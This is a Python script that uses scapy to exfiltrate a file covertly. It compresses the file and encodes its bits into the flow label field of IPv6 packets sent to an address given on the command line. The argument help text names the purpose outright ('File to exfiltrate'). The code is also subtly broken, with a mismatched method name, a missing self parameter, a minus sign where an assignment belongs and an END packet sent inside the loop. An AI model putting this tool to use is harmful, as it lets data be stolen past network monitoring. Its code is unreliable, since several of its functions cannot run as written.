import argparse
from scapy.all import *
from scapy.layers.inet6 import IPv6

class CC_Sender:
        BEGIN_KEYWORD = "BEGIN"
        END_KEYWORD = "END"
        PACKET_LEN = 20

        def __init__(self, file_input, dest, interval):
            self.file_input = file_input
            self.dest = dest
            self.interval = interval

            with open(self.file_input, 'rb') as f:
                data = f.read()

            self.raw_bits = self.prepare_data(data)

        def send_packet(self):
            position = 0
            sequence = 0
            bits_total = len(self.raw_bits)

            while position < bits_total:
                payload = self.raw_bits[position:(min(bits_total, position + self.PACKET_LEN))]

                payload_int = int("".join([str(b) for b in payload]), 2)

                ipv6_layer = IPv6(dst = self.dest, fl = payload_int)
                raw_layer = Raw(load = self.BEGIN_KEYWORD + "_" + str(bits_total) + "_" + str(sequence))
                pkt = ipv6_layer / raw_layer

                send(pkt, verbose = False)
                sequence = sequence + 1
                position = position + self.PACKET_LEN

                sys.stderr.write('.')
                if sequence % 50 == 0:
                    sys.stderr.write('/n')
                sys.stderr.flush()

                time.sleep(self.interval / 1000.0)

                pkt - IPv6(dst = self.dest) / Raw(load = self.END_KEYWORD)
                send(pkt, verbose = False)


        def create_data(self, data):
            out = io.BytesIO()
            with gzip.GzipFile(fileobj = out, mode = "w") as f:
                f.write(data)
            data = out.getvalue()

            raw_bits = []
            for c in data:
                raw_bits.extend(self.bitfield(c))

            return raw_bits

        def bitfield(n):

            bits = [int(digit) for digit in bin(n)[2:]]
            padded_bits = [0] * (8 - len(bits)) + bits

            return padded_bits

def main():
    parser = argparse.ArgumentParser(formatter_class = argparse.ArgumentDefaultsHelpFormatter)

    parser.add_argument("input_file", help = "File to exfiltrate")

    parser.add_argument("destination", help = "IPv6 address where to exfiltrate data")

    parser.add_argument("packet sending interval", dest = "sending_interval", type = float, default = 10, required = False, help = "Number of ms to wait between each IPv6 packet to send")

    args = parser.parse_args()
    sender = CC_Sender(args.input_file, args.destination, args.sending_interval)
    sender.send_packet()

if __name__ == "__main__":
    main()


